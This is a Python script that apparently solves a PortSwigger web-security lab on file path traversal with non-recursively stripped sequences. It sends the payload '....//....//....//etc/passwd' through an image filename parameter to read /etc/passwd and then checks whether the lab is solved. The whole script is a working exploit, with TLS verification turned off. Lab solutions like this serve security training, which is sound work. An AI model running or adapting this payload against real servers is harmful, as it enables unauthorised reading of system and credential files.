#!/usr/bin/env python3
# Lab: File path traversal, traversal sequences stripped non-recursively
# Lab-Link: https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively
# Difficulty: PRACTITIONER
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    print(f'[ ] Requesting content from /etc/passwd')
    r = client.get(f'{host}/image?filename=....//....//....//etc/passwd')
    if 'root:x:0:0:root:/root:/bin/bash' in r.text:
        print(f'[+] Response looks like /etc/passwd content')
    else:
        print(f'[-] Response does not look like it contains /etc/passwd content')

    print(f'[ ] Attempting to validate that lab is solved')
    r = client.get(host)
    if 'Congratulations, you solved the lab!' in r.text:
        print(f'[+] Lab solved')
    else:
        print(f'[-] Failed to solve lab')


if __name__ == "__main__":
    main()
